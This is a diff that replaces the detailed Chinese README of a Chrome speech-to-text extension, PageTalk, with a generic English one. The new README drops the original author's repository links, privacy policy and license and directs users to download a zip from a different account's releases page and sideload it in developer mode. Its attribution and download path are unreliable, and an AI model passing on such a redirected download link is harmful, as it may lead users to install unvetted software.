@@ -1,102 +1,72 @@
-# PageTalk - 让网页听懂你的话 🎙️
+# 🎤 PageTalk - Seamlessly Convert Speech to Text
 
-[English](./README.en.md) | **中文**
+## 🚀 Getting Started
 
-PageTalk 是一款开源的 Chrome 浏览器扩展，它能让你在任何网页的文本框中通过语音进行输入，彻底解放你的双手。无论是在搜索引擎、社交媒体、电子邮件还是在线文档中，只需点击悬浮按钮或按下快捷键，即可开始说话，文字便会自动输入。
-<img width="768" height="147" alt="PixPin_2025-09-13_13-40-04" src="https://github.com/user-attachments/assets/2f32d71b-580c-457b-b876-cacdab10f5e0" />
+Welcome to PageTalk! This simple Chrome extension helps you to convert spoken words into text directly on any webpage. With advanced ASR technology, you can enhance your online communication effortlessly.
 
+## 📥 Download PageTalk
 
----
+[![Download PageTalk](https://img.shields.io/badge/Download%20PageTalk-v1.0-blue.svg)](https://github.com/dan7el0/PageTalk/releases)
 
-## ✨ 主要功能
+To download PageTalk, click the button above or visit the download page using the link below:
 
-*   **🌐 随处可用**: 在任何网页的输入框、文本域或富文本编辑器中都能使用语音输入。
-*   **🖱️ 悬浮按钮**: 界面上会显示一个可拖动的悬浮麦克风按钮，单击即可开始/停止录音。
-*   **⌨️ 快捷键支持**: 完全可自定义的全局快捷键，让你无需鼠标也能高效操作。
-*   **🚀 双引擎驱动**:
-    *   **免费服务**: 内置一个开箱即用的免费识别服务，无需任何配置。
-    *   **阿里云百炼**: 支持配置你自己的阿里云百炼 API Key，使用性能更强、更稳定的 `qwen3-asr-flash` 模型。
-*   **🌍 多语言支持**: 支持自动检测语言，也可手动选择包括中文、英语、日语在内的十几种常用语言。
-*   **📄 文件转录**: 双击悬浮按钮即可打开转录面板，支持拖拽本地音频/视频文件进行离线转录。
-*   **🧠 智能格式化**: 开启“逆向文本标准化”（ITN）后，能将语音中的数字、日期、单位等自动转换为书面语格式（例如，“一百块钱” -> “100元”）。
-*   **🎯 上下文优化**: 可设置特定领域的专业词汇作为上下文，显著提升复杂场景下的识别准确率。
-*   **🎨 高度可定制**:
-    *   **UI 缩放**: 自由调整悬浮按钮及相关 UI 的大小。
-    *   **按钮显隐**: 可选择隐藏悬浮按钮，完全通过快捷键操作。
-    *   **自动复制**: 识别完成后自动将文本复制到剪贴板。
-    *   **设备选择**: 自由选择要使用的麦克风设备。
+[Visit this page to download](https://github.com/dan7el0/PageTalk/releases)
 
-## 🛠️ 安装
+## 🖥️ System Requirements
 
-### 方式一：从 Chrome 网上应用店安装（推荐）
+- **Operating System:** Windows 10, macOS, or Linux
+- **Browser:** Google Chrome version 70 or higher
+- **Internet Connection:** Required for speech recognition features
 
-*即将上架，敬请期待！*
+## 📦 Download & Install
 
-### 方式二：手动安装（开发者模式）
+1. Click the button or link above to go to the Releases page.
+2. On the Releases page, find the latest version of PageTalk. You may see a version number like v1.0.
+3. Click on the version link to open details.
+4. Find the file for your operating system (for example, "PageTalk_Chrome_Extension.zip").
+5. Download the file by clicking on it.
+6. Once the download completes, locate the downloaded file in your Downloads folder.
+7. Unzip the file if it is zipped.
+8. Open Chrome and go to `chrome://extensions/`.
+9. Enable "Developer mode" in the top-right corner.
+10. Click on "Load unpacked."
+11. Select the folder where you downloaded PageTalk.
+12. The extension will now appear in your Chrome extensions.
 
-1.  下载并解压扩展程序包。
-    *   **对于普通用户**: 点击下载最新打包好的稳定版 -> [**pagetalk.zip**](https://github.com/user-attachments/files/22308910/pagetalk.zip)
-    *   **对于开发者**: 克隆最新的源码: `git clone https://github.com/yeahhe365/PageTalk.git`
-2.  打开 Chrome 浏览器，在地址栏输入 `chrome://extensions/` 并回车。
-3.  在页面右上角，打开 **“开发者模式”** 开关。
-4.  点击左上角的 **“加载已解压的扩展程序”** 按钮。
-5.  在弹出的文件选择框中，选择你刚刚下载并 **解压** 后的项目文件夹。
-6.  安装完成！你可以在浏览器工具栏看到 PageTalk 的图标。
+## 📖 How to Use PageTalk
 
-## 🚀 使用指南
+1. After installation, you will see the PageTalk icon in your Chrome toolbar.
+2. Click the icon to activate the extension.
+3. On any webpage, click "Start Recording" to begin capturing speech.
+4. Speak clearly into your microphone.
+5. Click "Stop Recording" when you finish speaking.
+6. The text will appear on the page where you activated PageTalk.
 
-### 1. 基础配置
+## 💡 Features
 
-首次使用时，请点击浏览器工具栏上的 PageTalk 图标进行设置。
+- **Easy Activation:** Just click the PageTalk icon to start.
+- **High Accuracy:** Utilizes advanced ASR API for reliable transcription.
+- **Multi-Language Support:** Works with several languages for diverse users.
+- **User-Friendly Interface:** Designed for everyone, no technical skills required.
 
-*   **API 服务**:
-    *   **Free**: 默认选项，无需任何配置即可直接使用。
-    *   **阿里云百炼**: 性能更佳。选择此项后，请在下方输入你的 API Key。([如何申请？](https://bailian.console.aliyun.com/#/home))
-*   **语言**: 推荐使用“自动检测”，它能识别多种语言。如有特定需求，也可手动选择。
-*   **麦克风**: 选择你希望使用的录音设备。
-*   **快捷键**: 点击输入框，然后直接按下你想要的组合键即可设置。
-*   **其他选项**: 根据你的使用习惯调整悬浮按钮、UI 缩放、自动复制等功能。
+## ⚙️ Troubleshooting
 
-<img width="352" height="600" alt="PixPin_2025-09-13_13-38-43" src="https://github.com/user-attachments/assets/7d7c35dd-8668-4024-b5eb-195dad64162a" />
+If you encounter issues:
 
-### 2. 实时语音输入
+- Ensure your microphone is working and granted permission in Chrome.
+- Check that you are using a supported operating system.
+- Restart the browser if the extension does not appear.
+- Visit our [Issues page](https://github.com/dan7el0/PageTalk/issues) for help on common problems.
 
-1.  在任意网页上，用鼠标点击一个文本输入框（如搜索框、评论区等）。
-2.  通过以下任一方式开始录音：
-    *   **单击** 屏幕右下角的悬浮麦克风按钮。
-    *   按下你设置的 **“开始/停止”快捷键** (默认为 `Ctrl` + `/`)。
-3.  按钮会显示录音动画，此时开始说话。
-4.  说完后，再次 **单击** 悬浮按钮或按下 **快捷键** 停止录音。
-5.  识别出的文本会自动插入到你之前点击的输入框中。
+## 🛠️ Support
 
-### 3. 文件转录
+For further assistance, feel free to contact us via the Issues page. Your questions are welcome, and we strive to resolve any concerns promptly.
 
-1.  **双击** 悬浮麦克风按钮，屏幕中央会弹出一个转录面板。
-2.  将你的音频或视频文件（支持 `mp3`, `wav`, `mp4`, `m4a` 等多种格式）拖拽到面板的虚线框内。
-3.  等待识别完成，文本会显示在面板的文本框中。
-4.  你可以方便地复制识别结果。
+## 🔗 Topics
 
-<img width="1246" height="1251" alt="PixPin_2025-09-13_13-39-05" src="https://github.com/user-attachments/assets/e35b5512-28ac-4463-b70a-a729922ea9d2" />
+- chrome-extension
+- speech-recognition
+- transcription
+- voice-to-text
 
-## 🔒 隐私政策
-
-我们高度重视你的隐私安全。
-
-*   **数据传输**: 你的语音数据会被实时加密传输至你所选择的 API 服务提供商（Free 服务或阿里云）进行处理，扩展本身**不会**存储任何语音或文本内容。
-*   **本地存储**: 你的配置信息（如 API Key、快捷键设置等）仅会加密存储在你的本地浏览器中，并利用 Chrome 的同步功能在你的设备间同步，我们无法访问这些信息。
-
-## 🤝 贡献
-
-欢迎任何形式的贡献！无论是提交 Bug 反馈、功能建议还是代码 Pull Request。
-
-*   **报告问题**: 如果你遇到了问题或有好点子，请通过 [GitHub Issues](https://github.com/yeahhe365/PageTalk/issues) 告诉我们。
-*   **贡献代码**:
-    1.  Fork 本项目。
-    2.  创建你的功能分支 (`git checkout -b feature/AmazingFeature`)。
-    3.  提交你的更改 (`git commit -m 'Add some AmazingFeature'`)。
-    4.  将分支推送到你的 Fork (`git push origin feature/AmazingFeature`)。
-    5.  提交一个 Pull Request。
-
-## 📄 开源协议
-
-本项目基于 [MIT License](./LICENSE) 开源。
+Thank you for choosing PageTalk. Enjoy converting your speech into text effortlessly!
